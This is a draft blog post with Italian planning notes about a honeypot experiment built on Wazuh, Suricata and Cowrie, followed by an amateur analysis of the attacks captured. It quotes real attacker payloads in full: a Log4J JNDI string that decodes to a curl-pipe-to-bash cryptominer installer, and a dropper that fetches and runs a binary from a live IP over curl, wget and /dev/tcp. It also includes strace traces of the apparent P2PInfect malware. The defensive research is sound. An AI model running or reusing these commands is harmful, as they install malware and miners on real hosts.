@@ -1,0 +1,386 @@
+### File da analizzare:
+
+- Access log apache
+- Cowrie log
+- Pcap
+- Eve.json
+- Malware serio
+- Malware facile
+
+#### Come impostare articolo
+- Descrivere Wazuh e honeypot
+- Setup delle soluzioni
+- Risultati
+- risultato 1
+- risultato 2
+- ...
+- Conclusioni
+
+#### Articolo
+
+During Christmas holiday, I was reviewing my Github account and I found a funny web applications that I developed for an universitary course. It's Meme Generator, which obviosly allow user to see communicaty-created meme and, if registered, to create its own memes.
+Being an introductory course on web application development, security was unfortunately out-of-scope. I start thinking what could happen if I would expose the app on Internet. Would hackers be interested on breaking it? Would they be able to do that? Would they be able to find it in the very first place?
+Let's try it.
+Beside the application, I needed:
+- A way to understand if something strange is happening on my web server.
+- I would like to know what kind of requests reach it.
+- A software to centralize all these information.
+
+I found out that Wazuh can satisfy both point 1. and 3. Wazuh is an open-source XDR and SIEM solutions: this means that the agent can monitor the endpoint where application is hosted and figure out if some malicious actions is taking place; moreover the SIEM can collect telemetry data for future analysis.
+Regarding point 2. I decided to use Suricata which is a IDS/IPS solution, therefore can help me to understand if some strange requests is hitting the server. Finally, I forwarded Suricata alerts to Wazuh SIEM.
+
+I didn't plan to use an SSH honeypot in the first place, but after some trials, I thought it may be a good idea to make the server more attractive for the bad guys. After trying a bunch of open-source projects, I went with Cowrie ()
+
+##### Infrastructure design
+I used cloud provider to setup 2 VMs: the first one hosted the web server and it is equipped with Wazuh agent, which monitor the system. Moreover, Suricata has been installed and setup to alert if web server is asked for weird content. Obviously, this one is Internet facing.
+A second VM serves to host Wazuh console, which allow me to check alert and collect logs sent by the web-server. It is not internet-facing.
+Comunnications between the VMs was filtered by the cloud-provider's firewall: in fact, it only permits the web-server to communicate with Wazuh console. This would avoid an attacker to reach also my central console.
+
+##### Web-app Setup
+The application is very simple. It has been written mainly in Javascript, using a nodeJS server written in ExpressJS.
+
+
+##### Wazuh Setup
+In this test, I deployed Wazuh agent on the web server and Wazuh console. Basically, the agent monitor the hosts, looking for suspicious actions and sends notifications to Wazuh console. Wazuh offers different features to detect malicious actions, but it needs to be properly configured.
+Among the different features that can be enabled on Wazuh, I decide to try out the following:
+1. File Integroty Monitoring: features that checks some folder/file for changes. It is useful to figure out if sensitive folders has been hacked. Among the common folder (/usr, /bin, /etc), I included also the folder where Cowrie drop files downloaded by user connected via SSH.
+2. Integration with VirusTotal: VirusTotal is ... . I used the API key provided with free account to connect Wazuh with VirusTotal. This feature allows to automatically scan monitored folders once a change occurs. 
+3. Enable hidden process detection: it allows to detects hidden processes created by rootkit.
+
+In addition, I decide to send to SIEM logs from additional sources:
+1. access.log: logs from ExpressJS server. Here I decided to raise the priority of default rules to be alerted on every requests again the the server.
+2. cowrie.log: logs from honeypot. Since I would have like to be notified on every suspicious commands or login attempts, I looked at some log entry and construct a couple of rule on Wazuh to be alerted whenever a login attempts or any commands is executed
+3. eve.log: logs from Suricata. The alerts from Suricata are automatically sent to dashboard's alerts thanks to predefined rules.
+
+Finally, every configuration has been set to just monitor and alert and avoid blocking malicious actions: in fact, I would like to see how far an attacker could go with webserver configurations.
+The configuration is far from being exhaustive but I thought it is enough to understand if some malicious actions is occurring. 
+
+##### Suricata Setup
+I installed Suricata on the server which raise an alert (then forwarded to Wazuh SIEM) based on a predefined set of rules. I decided to use the "Emerging threats" ruleset (https://community.emergingthreats.net) as recommended by many.
+
+##### SSH honeypot Setup
+Cowrie is a medium to high interaction SSH honeypot design to emulate UNIX systems and log every actions. It has been written in Python and offers more features than the ones that I tried (for example, it's also a Telnet honeypot).
+Even it works enough good "out-of-the-box", allowing to log actions and retrieve files dropped in the fake system, I found the documentation a bit lacky and unclear on some topics.
+Cowrie is available in a dockerized version, which make it even more easier to be used. After running the container and forwarding the traffic, it immeatialy starts to log.
+I decide to set it up in order to allow login with any username/password after a few login attemps.
+
+#### Results
+After setting everything up, it's time to run it and wait for results. I run it for about 72 hours.
+Despite I would expected more iteractions with the application, actually some strange requests and command has been launch against the server. I believe that most of them were conducted by automatized bots, but I'm quite happy with that anyway.
+Here some generals statistics collected with the SIEM:
+
+1. The following one is the number of brute-force attempts grouped by username. As expected, "root" is the most 
+
+2. Here the categorization of malicious traffics given by Suricata. I find some of them interesting:
+- Attempted Administrator Privilege Gain. From Suricata it seems to be alerting against CVE_2018_11776. Details here: https://www.keysight.com/blogs/en/tech/nwvs/2022/06/03/strutting-to-remote-code-execution-anatomy-of-cve-2018-11776
+- Attempted User Privilege Gain. Even if detection is different, it seems to have the same aim (la prima appartiene a questo ruleset https://github.com/jpalanco/alienvault-ossim/blob/master/snort-rules-default-open/rules/2.9.2/emerging.rules/emerging-exploit.rules)
+
+There's has been also an attempt to drop a cryptominer via Log4J attack. On Christmas day, at 15:58 (Rome time) I receive the following request against the web server: (interessante sapere se è stato rilevato da Suricata, anche se encoded)
+GET / HTTP/1.1" 200 3230 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//cdn.x4b.lol:3306/TomcatBypass/Command/Base64/Y3VybCAtcyAtTCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQzNQb29sL3htcmlnX3NldHVwL21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBiYXNoIC1zIDQ4Nnhxdzd5c1hkS3c3UmtWelQ1dGRTaUR0RTZzb3hVZFlhR2FHRTFHb2FDZHZCRjdyVmc1b01YTDlwRngzckIxV1VDWnJKdmQ2QUhNRldpcGVZdDVlRk5VeDlwbUdO}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//cdn.x4b.lol:3306/TomcatBypass/Command/Base64/Y3VybCAtcyAtTCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQzNQb29sL3htcmlnX3NldHVwL21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBiYXNoIC1zIDQ4Nnhxdzd5c1hkS3c3UmtWelQ1dGRTaUR0RTZzb3hVZFlhR2FHRTFHb2FDZHZCRjdyVmc1b01YTDlwRngzckIxV1VDWnJKdmQ2QUhNRldpcGVZdDVlRk5VeDlwbUdO}')"
+
+Decoding base64 string, I got:
+Y3VybCAtcyAtTCBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vQzNQb29sL3htcmlnX3NldHVwL21hc3Rlci9zZXR1cF9jM3Bvb2xfbWluZXIuc2ggfCBiYXNoIC1zIDQ4Nnhxdzd5c1hkS3c3UmtWelQ1dGRTaUR0RTZzb3hVZFlhR2FHRTFHb2FDZHZCRjdyVmc1b01YTDlwRngzckIxV1VDWnJKdmQ2QUhNRldpcGVZdDVlRk5VeDlwbUdO
+curl -s -L https://raw.githubusercontent.com/C3Pool/xmrig_setup/master/setup_c3pool_miner.sh | bash -s 486xqw7ysXdKw7RkVzT5tdSiDtE6soxUdYaGaGE1GoaCdvBF7rVg5oMXL9pFx3rB1WUCZrJvd6AHMFWipeYt5eFNUx9pmGN
+(https://blog.criminalip.io/2022/02/11/criminal-ip-analysis-report-on-log4j-attack-patterns/)
+
+"Unfortunately", I didn't use log4j and the attack didn't go well. Anyway, from the decoding string, it is possible to notice that the aim of the attack is to download "xmrig_setup", an opensource miner, and sent crypto to the attacker's wallet.
+
+As soon as I was loosing any hope to get something interesting, a curl command was launch in the honeypot:
+
+curl http://74.208.103.29:60116/linux -o /tmp/hhXx6VBudz; if [ ! -f /tmp/hhXx6VBudz ]; then wget http://74.208.103.29:60116/linux -O /tmp/hhXx6VBudz; fi; if [ ! -f /tmp/hhXx6VBudz ]; then exec 6<>/dev/tcp/74.208.103.29/60116 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/hhXx6VBudz && chmod +x /tmp/hhXx6VBudz && /tmp/hhXx6VBudz amUKy2H88jbv/3/NEHQcGX8IzH7/+CD2+mHODn0FGnUN0n33+zbx/37KHnEYBXQLymH/+S74+3XKDnQfHmUPxX/g8DTv/X3SB3ERHXUPyHbu9TPv/3rJEHQcE2sNxHX48THw/W/IDWsaGHEQznz87zj7+H/NDHALGHIQznz57zby4HrEBHMbGncH3Hn/7zH3/mHOD3YFGXYHxnn+8DL07nfSDHQTBXcNzGH/9DL7+H/ND3MLHXQQzXr67zHy9mHNDnIRHXUPyH3u8Dj04HjEEHQYGGsMz3/09zDw+nvcD3cYBXQLy2H5+C7y+nXKDnQfEmUKy2H/8TDv/WHOC3YRHXUPzH/u9TPv/3rJEHQdEmsLyXX48TH1/W/OD3QFGn0O0n3/+C7z/HvGCHUaG3Ieyn7g8DX24H7LCWsZGXwEyn//8jTh/3/EEHQTGmsPzn3g8zLw9HnMD3UaC3EL0n79+S7w+XvSD3wSEXMOzX754TL24H3ODWsZGGsIzXX48THz/m/ND3wFGn0G0n74+S7w+nrGCHUaH3EezX//7zP14H3PCGsaHncEyn//9Tfh/HzSB3EFGXYL0nf09zDw/HzcD3IbBXQOymH/9jTv/3jNBHMbGnUN3H388S7w+XbSD3wTBXcLxnn+8DH07nzLEHcYHGsMzHrg+DD7+H/NDHULE2sMzXjg8DTz4H7LCn8dG3QNyG/88zHv/3/SD3cfBXQKznX48THz+2/ED2sZGnEQzXz67zH09nXKDnQfE2UPzXbg8DPv9nfSDHEbEXMOzX/34TLz/mHNCHQFGncM0n3/8Tr3/n7OCxu4ApTkr8lQCGGraDz9MHV6; fi; echo password > /tmp/.opass; chmod +x /tmp/hhXx6VBudz && /tmp/hhXx6VBudz amUKy2H88jbv/3/NEHQcGX8IzH7/+CD2+mHODn0FGnUN0n33+zbx/37KHnEYBXQLymH/+S74+3XKDnQfHmUPxX/g8DTv/X3SB3ERHXUPyHbu9TPv/3rJEHQcE2sNxHX48THw/W/IDWsaGHEQznz87zj7+H/NDHALGHIQznz57zby4HrEBHMbGncH3Hn/7zH3/mHOD3YFGXYHxnn+8DL07nfSDHQTBXcNzGH/9DL7+H/ND3MLHXQQzXr67zHy9mHNDnIRHXUPyH3u8Dj04HjEEHQYGGsMz3/09zDw+nvcD3cYBXQLy2H5+C7y+nXKDnQfEmUKy2H/8TDv/WHOC3YRHXUPzH/u9TPv/3rJEHQdEmsLyXX48TH1/W/OD3QFGn0O0n3/+C7z/HvGCHUaG3Ieyn7g8DX24H7LCWsZGXwEyn//8jTh/3/EEHQTGmsPzn3g8zLw9HnMD3UaC3EL0n79+S7w+XvSD3wSEXMOzX754TL24H3ODWsZGGsIzXX48THz/m/ND3wFGn0G0n74+S7w+nrGCHUaH3EezX//7zP14H3PCGsaHncEyn//9Tfh/HzSB3EFGXYL0nf09zDw/HzcD3IbBXQOymH/9jTv/3jNBHMbGnUN3H388S7w+XbSD3wTBXcLxnn+8DH07nzLEHcYHGsMzHrg+DD7+H/NDHULE2sMzXjg8DTz4H7LCn8dG3QNyG/88zHv/3/SD3cfBXQKznX48THz+2/ED2sZGnEQzXz67zH09nXKDnQfE2UPzXbg8DPv9nfSDHEbEXMOzX/34TLz/mHNCHQFGncM0n3/8Tr3/n7OCxu4ApTkr8lQCGGraDz9MHV6 &
+
+The first thing that come up to my eyes is the rendundacy of the script trying to download the file with "curl", "wget" and using lower-level methods: likely to overcome difficult of finding the tool on the system or avoid detections.
+After downloading the script, it write the string "password" in a file under /tmp and execute the script with the argument "amUKy2H88jbv/3/NEHQcGX8IzH7/+CD2+mHODn0FGnUN0n33+zbx/37KHnEYBXQLymH/+S74+3XKDnQfHmUPxX/g8DTv/X3SB3ERHXUPyHbu9TPv/3rJEHQcE2sNxHX48THw/W/IDWsaGHEQznz87zj7+H/NDHALGHIQznz57zby4HrEBHMbGncH3Hn/7zH3/mHOD3YFGXYHxnn+8DL07nfSDHQTBXcNzGH/9DL7+H/ND3MLHXQQzXr67zHy9mHNDnIRHXUPyH3u8Dj04HjEEHQYGGsMz3/09zDw+nvcD3cYBXQLy2H5+C7y+nXKDnQfEmUKy2H/8TDv/WHOC3YRHXUPzH/u9TPv/3rJEHQdEmsLyXX48TH1/W/OD3QFGn0O0n3/+C7z/HvGCHUaG3Ieyn7g8DX24H7LCWsZGXwEyn//8jTh/3/EEHQTGmsPzn3g8zLw9HnMD3UaC3EL0n79+S7w+XvSD3wSEXMOzX754TL24H3ODWsZGGsIzXX48THz/m/ND3wFGn0G0n74+S7w+nrGCHUaH3EezX//7zP14H3PCGsaHncEyn//9Tfh/HzSB3EFGXYL0nf09zDw/HzcD3IbBXQOymH/9jTv/3jNBHMbGnUN3H388S7w+XbSD3wTBXcLxnn+8DH07nzLEHcYHGsMzHrg+DD7+H/NDHULE2sMzXjg8DTz4H7LCn8dG3QNyG/88zHv/3/SD3cfBXQKznX48THz+2/ED2sZGnEQzXz67zH09nXKDnQfE2UPzXbg8DPv9nfSDHEbEXMOzX/34TLz/mHNCHQFGncM0n3/8Tr3/n7OCxu4ApTkr8lQCGGraDz9MHV6".
+I'm not quite familiar with malware analysis, but I was very curious to understand what the script does.
+First thing, I decided to use "Hybrid Analysis" to get some clues. The results that can found here https://www.hybrid-analysis.com/sample/1e2686c1a674630311fdab9b74df54605309076b6d2c3acb4dbc0e7c0080bfa4?environmentId=310. The list of MITRE ATT&CK techniques recognized are briefly:
+
+1. T1106: Adversarie interact with native OS.
+2. T1027: Obfuscated File or information: section header missing, binary statically linked.
+3. T1497: Sandbox evasion.
+4. T1480: Execution Guardrails.
+5. T1018: Attempt to get a listing  of other systems.
+6. T1003.008: Credential Access.
+7. T1071: Attempt to communicate.
+8. T1573: Employ encryption algorith.
+
+Ok, it may be useful but it still unclear the final goal of the script.
+
+I used "readelf" utility to get some static property of the files but it seems to be statically linked and stripped; it may not be so informative as I thought.
+In addition, a further scan with VirusTotal seems to categorize it as a "P2PInfect" malware: in a few words it's a malware which exploit a Redis vulnerability and then drop executable needed to join the host on a P2P network. Once joined, additional payloads are downloaded based on OS.(here a good explanation from Palo Alto Unit42: https://unit42.paloaltonetworks.com/peer-to-peer-worm-p2pinfect/).
+Out of curiosity, I setup a new VMs to investigate a little further and I started trace out syscall with "strace" (full output on Github). There are tons of suspicious calls like reading "/etc/shadow" and "/etc/passwd" or open new connections.
+About connections, looking at firewall logs (every inbound/outbound connections was blocked). I noticed that it started contacting different IP addresses (maybe other P2P nodes as Unit 42 article state)
+
+After some research, I decided that this work require tons of time and ability, therefore I'll write a new post with a proper analysis.
+
+#### Conclusions
+At the beginning, I had in mind different scenarios in which hackers would try to break my applications and reach the database. Instead I got a lot of likely bot-driven traffic and hacking attempts. At the end, it's also true that no hackers would have spent a lot of time breaking an application which probably doesn't worth it.
+Also, running the VMs for just 3 days didn't help.
+Anyway, I'm quite satisfied with the results, expecially with the proably "P2PInfect" malware which I look forward to analyze. Moreover, I really appreciate having the chance to use Wazuh which I would like to try for months.
+ 
+
+
+#### Priorità:
+1. Malware serio 3 ore
+2. Statistiche da Wazuh 1.5 ore
+3. In base a punto 3 e eve.json, vediamo se c'è qualche pcap utile 2 ore
+4. Malware facile (citare niente di troppo approfondito perchè alla fine è un cryptominer) 1 ora
+5. (Opzionale) Access log apache. Vediamo se facendo delle query esce fuori qualcosa
+6. (Opzionale) Cowrie log come 5
+
+#### Come analizzare il malware serio?
+1. Capire se è una minaccia già nota e ci sono blog che ne parlano X
+2. Cercare di capire cosa fa
+3. Partendo dall'analisi di hybrid analysis, spiegare perchè segnala determinati indicatori
+- Punto 2 e 3 utilizzare una sandbox (analisi dinamica, statica se proprio serve)
+
+### Analisi malware serio
+
+#### Informazioni (punto 1)
+Dall'analisi di virustotal potrebbe trattarsi di P2PInfect worm.
+- Sfrutta una vulnerabilità (CVE Score: 10) di redis per join il dispositivo ad una rete P2P
+- According to Palo Alto Networks, infected servers were observed scanning for additional Redis instances, but also performing scanning over SSH port 22.
+- L'attacco potrebbe essere partito da un'altra istanza infetta: sembra che P2Pinfect abbia la capacità di scansionare porte SSH utilizzando un dizionario di pass communicate
+- Si potrebbe trattare della variente MIPS (https://www.cadosecurity.com/p2pinfect-new-variant-targets-mips-devices/)?
+
+Stringa iniziale:
+
+"""
+curl http://74.208.103.29:60116/linux -o /tmp/hhXx6VBudz; if [ ! -f /tmp/hhXx6VBudz ]; then wget http://74.208.103.29:60116/linux -O /tmp/hhXx6VBudz; fi; if [ ! -f /tmp/hhXx6VBudz ]; then exec 6<>/dev/tcp/74.208.103.29/60116 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/hhXx6VBudz && chmod +x /tmp/hhXx6VBudz && /tmp/hhXx6VBudz amUKy2H88jbv/3/NEHQcGX8IzH7/+CD2+mHODn0FGnUN0n33+zbx/37KHnEYBXQLymH/+S74+3XKDnQfHmUPxX/g8DTv/X3SB3ERHXUPyHbu9TPv/3rJEHQcE2sNxHX48THw/W/IDWsaGHEQznz87zj7+H/NDHALGHIQznz57zby4HrEBHMbGncH3Hn/7zH3/mHOD3YFGXYHxnn+8DL07nfSDHQTBXcNzGH/9DL7+H/ND3MLHXQQzXr67zHy9mHNDnIRHXUPyH3u8Dj04HjEEHQYGGsMz3/09zDw+nvcD3cYBXQLy2H5+C7y+nXKDnQfEmUKy2H/8TDv/WHOC3YRHXUPzH/u9TPv/3rJEHQdEmsLyXX48TH1/W/OD3QFGn0O0n3/+C7z/HvGCHUaG3Ieyn7g8DX24H7LCWsZGXwEyn//8jTh/3/EEHQTGmsPzn3g8zLw9HnMD3UaC3EL0n79+S7w+XvSD3wSEXMOzX754TL24H3ODWsZGGsIzXX48THz/m/ND3wFGn0G0n74+S7w+nrGCHUaH3EezX//7zP14H3PCGsaHncEyn//9Tfh/HzSB3EFGXYL0nf09zDw/HzcD3IbBXQOymH/9jTv/3jNBHMbGnUN3H388S7w+XbSD3wTBXcLxnn+8DH07nzLEHcYHGsMzHrg+DD7+H/NDHULE2sMzXjg8DTz4H7LCn8dG3QNyG/88zHv/3/SD3cfBXQKznX48THz+2/ED2sZGnEQzXz67zH09nXKDnQfE2UPzXbg8DPv9nfSDHEbEXMOzX/34TLz/mHNCHQFGncM0n3/8Tr3/n7OCxu4ApTkr8lQCGGraDz9MHV6; fi; echo password > /tmp/.opass; chmod +x /tmp/hhXx6VBudz && /tmp/hhXx6VBudz amUKy2H88jbv/3/NEHQcGX8IzH7/+CD2+mHODn0FGnUN0n33+zbx/37KHnEYBXQLymH/+S74+3XKDnQfHmUPxX/g8DTv/X3SB3ERHXUPyHbu9TPv/3rJEHQcE2sNxHX48THw/W/IDWsaGHEQznz87zj7+H/NDHALGHIQznz57zby4HrEBHMbGncH3Hn/7zH3/mHOD3YFGXYHxnn+8DL07nfSDHQTBXcNzGH/9DL7+H/ND3MLHXQQzXr67zHy9mHNDnIRHXUPyH3u8Dj04HjEEHQYGGsMz3/09zDw+nvcD3cYBXQLy2H5+C7y+nXKDnQfEmUKy2H/8TDv/WHOC3YRHXUPzH/u9TPv/3rJEHQdEmsLyXX48TH1/W/OD3QFGn0O0n3/+C7z/HvGCHUaG3Ieyn7g8DX24H7LCWsZGXwEyn//8jTh/3/EEHQTGmsPzn3g8zLw9HnMD3UaC3EL0n79+S7w+XvSD3wSEXMOzX754TL24H3ODWsZGGsIzXX48THz/m/ND3wFGn0G0n74+S7w+nrGCHUaH3EezX//7zP14H3PCGsaHncEyn//9Tfh/HzSB3EFGXYL0nf09zDw/HzcD3IbBXQOymH/9jTv/3jNBHMbGnUN3H388S7w+XbSD3wTBXcLxnn+8DH07nzLEHcYHGsMzHrg+DD7+H/NDHULE2sMzXjg8DTz4H7LCn8dG3QNyG/88zHv/3/SD3cfBXQKznX48THz+2/ED2sZGnEQzXz67zH09nXKDnQfE2UPzXbg8DPv9nfSDHEbEXMOzX/34TLz/mHNCHQFGncM0n3/8Tr3/n7OCxu4ApTkr8lQCGGraDz9MHV6 &
+"""
+
+#### Cercare di capire cosa fa (punto 2)
+
+Export strace
+
+strace ./hhXx6VBudz
+# Spawn di processo ?
+execve("./hhXx6VBudz", ["./hhXx6VBudz"], 0x7ffe7c1ac740 /* 24 vars */) = 0
+# Open info su processo stesso
+open("/proc/self/exe", O_RDONLY)        = 3
+
+# Crea uno spazio di memoria e lo mette come eseguibile PROT_EXEC
+mmap(NULL, 3055, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f6b046cc000
+mprotect(0x7f6b046cc000, 3055, PROT_READ|PROT_EXEC) = 0
+
+# readlink() places the contents of the symbolic link pathname in the buffer buf, which has size bufsiz.
+# la chiamata di sistema readlink in un contesto Linux è utilizzata per ottenere il percorso assoluto dell'eseguibile del processo corrente.
+readlink("/proc/self/exe", "/home/degiorgilorenzo718/hhXx6VB"..., 4095) = 35
+
+# Crea uno spazio di memoria e lo mette come eseguibile PROT_EXEC
+mmap(0x400000, 8226784, PROT_NONE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x400000
+mmap(0x400000, 5015872, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x400000
+mprotect(0x400000, 5015872, PROT_READ|PROT_EXEC) = 0
+mmap(0xac9000, 798608, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0x4c9000) = 0xac9000
+mprotect(0xac9000, 798608, PROT_READ|PROT_WRITE) = 0
+mmap(0xb8c000, 313312, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb8c000
+munmap(0xbe0000, 2388070)               = 0
+mmap(NULL, 4096, PROT_READ, MAP_PRIVATE, 3, 0) = 0x7f6b046cb000
+
+# closes a file descriptor
+close(3)                                = 0
+
+# Rilascia la porzione di memoria del primo punto
+munmap(0x7f6b046cc000, 3055)            = 0
+mmap(NULL, 3232, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f6b046cc000
+
+#arch_prctl è usata per leggere/modificare impostazioni a basso livello di x86-64. In questo caso (ARCH_SET_FS) imposta il registro FS per il thread corrento a quell'indirizzo
+arch_prctl(ARCH_SET_FS, 0x7f6b046ccbd8) = 0
+
+# Troppo complicato
+set_tid_address(0xbd87d8)               = 2230
+readlink("/etc/_rjem_malloc.conf", 0x7ffe36910968, 4096) = -1 ENOENT (No such file or directory)
+mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f6b046ca000
+madvise(0x7f6b046ca000, 4096, MADV_DONTNEED) = 0
+munmap(0x7f6b046ca000, 4096)            = 0
+
+# Il file overcommit_memory è utilizzato per controllare la politica di overcommit della memoria del kernel
+# Il file overcommit_memory è utilizzato per configurare come il kernel Linux gestisce l'allocazione di memoria che supera la quantità fisica di RAM e di swap. 
+# Se stampo il file overcommit_memory contiente "1"
+open("/proc/sys/vm/overcommit_memory", O_RDONLY|O_CLOEXEC) = 3
+read(3, "1", 1)                         = 1
+close(3)                                = 0
+
+# in Linux è utilizzato per controllare il comportamento delle Transparent Huge Pages (THP). Puo portare ad usare pagine di dimensioni maggiori per migliore le prestazioni.
+# Infatti poi si usa madvise
+# Se stampo il file enabled contiene always [madvise] never
+open("/sys/kernel/mm/transparent_hugepage/enabled", O_RDONLY) = 3
+read(3, "always [madvise] never\n", 24) = 23
+close(3)  
+                              = 0
+mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_NORESERVE, -1, 0) = 0x7f6b046ca000
+madvise(0x7f6b046ca000, 4096, MADV_FREE) = 0
+munmap(0x7f6b046ca000, 4096)            = 0
+mmap(NULL, 2097152, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_NORESERVE, -1, 0) = 0x7f6b044cb000
+munmap(0x7f6b044cb000, 2097152)         = 0
+mmap(NULL, 4190208, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_NORESERVE, -1, 0) = 0x7f6b042cc000
+munmap(0x7f6b042cc000, 1261568)         = 0
+munmap(0x7f6b04600000, 831488)          = 0
+# Imposta la fine del segmento dati (heap). Il null è strano
+
+brk(NULL)                               = 0x1b2f000
+mmap(NULL, 2097152, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_NORESERVE, -1, 0) = 0x7f6b04200000
+# Usata per ottenere l'affinità di CPU di un processo, cioè su quali processori è autorizzato a eseguire
+sched_getaffinity(0, 128, [0, 1])       = 8
+
+brk(NULL)                               = 0x1b2f000
+brk(0x1b31000)                          = 0x1b31000
+mmap(0x1b2f000, 4096, PROT_NONE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0x1b2f000
+mmap(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0x7f6b046ca000
+poll([{fd=0, events=0}, {fd=1, events=0}, {fd=2, events=0}], 3, 0) = 0 (Timeout)
+rt_sigaction(SIGPIPE, {sa_handler=SIG_IGN, sa_mask=[], sa_flags=SA_RESTORER|SA_RESTART, sa_restorer=0x740716}, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
+rt_sigaction(SIGSEGV, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
+rt_sigprocmask(SIG_UNBLOCK, [RT_1 RT_2], NULL, 8) = 0
+rt_sigaction(SIGSEGV, {sa_handler=0x5e7d00, sa_mask=[], sa_flags=SA_RESTORER|SA_ONSTACK|SA_SIGINFO, sa_restorer=0x740716}, NULL, 8) = 0
+rt_sigaction(SIGBUS, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
+rt_sigaction(SIGBUS, {sa_handler=0x5e7d00, sa_mask=[], sa_flags=SA_RESTORER|SA_ONSTACK|SA_SIGINFO, sa_restorer=0x740716}, NULL, 8) = 0
+sigaltstack(NULL, {ss_sp=NULL, ss_flags=SS_DISABLE, ss_size=0}) = 0
+mmap(NULL, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_STACK, -1, 0) = 0x7f6b046c7000
+mprotect(0x7f6b046c7000, 4096, PROT_NONE) = 0
+sigaltstack({ss_sp=0x7f6b046c8000, ss_flags=0, ss_size=8192}, NULL) = 0
+rt_sigprocmask(SIG_BLOCK, ~[RTMIN RT_1 RT_2], [], 8) = 0
+rt_sigprocmask(SIG_BLOCK, ~[], ~[KILL STOP RTMIN RT_1 RT_2], 8) = 0
+
+# Fork del processo. Interessante
+
+fork()                                  = 2231
+rt_sigprocmask(SIG_SETMASK, ~[KILL STOP RTMIN RT_1 RT_2], NULL, 8) = 0
+rt_sigprocmask(SIG_SETMASK, [], NULL, 8) = 0
+sigaltstack({ss_sp=NULL, ss_flags=SS_DISABLE, ss_size=8192}, NULL) = 0
+munmap(0x7f6b046c7000, 12288)           = 0
+exit_group(0)                           = ?
++++ exited with 0 +++
+
+Dal strace non ci sono altre syscall. Forse devo tracciare il processo figlio.
+Cosi funziona. Vedi file full_dump_malware_strace
+
+Note:
+- sposta alcuni eseguibili come curl, wget e li rinomina
+- chiede permessi di cartelle come homedir, etc..
+- modifica iptables
+- comando strano: 2425  <... read resumed>"#! /bin/sh\nset -ef\n\nif test -n \""..., 8192) = 946
+- 2428  openat(AT_FDCWD, "/tmp/clearsigned.message.yG5ZtM", O_RDWR|O_CREAT|O_EXCL, 0600 <unfinished ...>: esiste un file del genere con scritte le righe successive 
+- 2423  execve("/sbin/unix_chkpwd", ["/sbin/unix_chkpwd", "degiorgilorenzo718", "nullok"], 0x7f9103c7b3c0 /* 0 vars */) = 0
+- rite(1, "123456\n", 7 <unfinished ...>
+2447  stat("/usr/bin/passwd",  <unfinished ...>
+2446  <... write resumed>)              = 7
+2447  <... stat resumed>{st_mode=S_IFREG|S_ISUID|0755, st_size=68208, ...}) = 0
+2446  write(1, "Pa_1Bisznm\n", 11 <unfinished ...>
+- 2447  write(1, "Changing password for degiorgilo"..., 42) = 42
+- 2455  execve("/usr/bin/sudo", ["sudo", "-S", "passwd", "nobody"], 0x55e43cf99a00 /* 25 vars */) = 0
+- 2471  execve("/usr/local/sbin/systemctl", ["systemctl", "restart", "sshd.service"], 0x564f69f7a838 /* 25 vars */ <unfinished ...>
+
+
+
+Firewall log
+
+Appena lanciato il comando con parametro
+
+112 6 tap112i0-OUT 12/Jan/2024:20:45:16 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=47.236.101.172 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=2159 DF PROTO=TCP SPT=47996 DPT=60119 SEQ=4254444133 ACK=0 WINDOW=64240 SYN 
+112 6 tap112i0-OUT 12/Jan/2024:20:45:16 +0100 DROP: IN=fwbr112i0 OUT=fwbr112i0 PHYSIN=tap112i0 PHYSOUT=fwln112i0 MAC=20:b0:01:fb:c2:ae:3e:b4:34:35:a7:44:08:00 SRC=192.168.1.138 DST=221.10.124.142 LEN=60 TOS=0x00 PREC=0x00 TTL=64 ID=29462 DF PROTO=TCP SPT=33174 DPT=60125 SEQ=4103930081 ACK=0 WINDOW=64240 SYN 
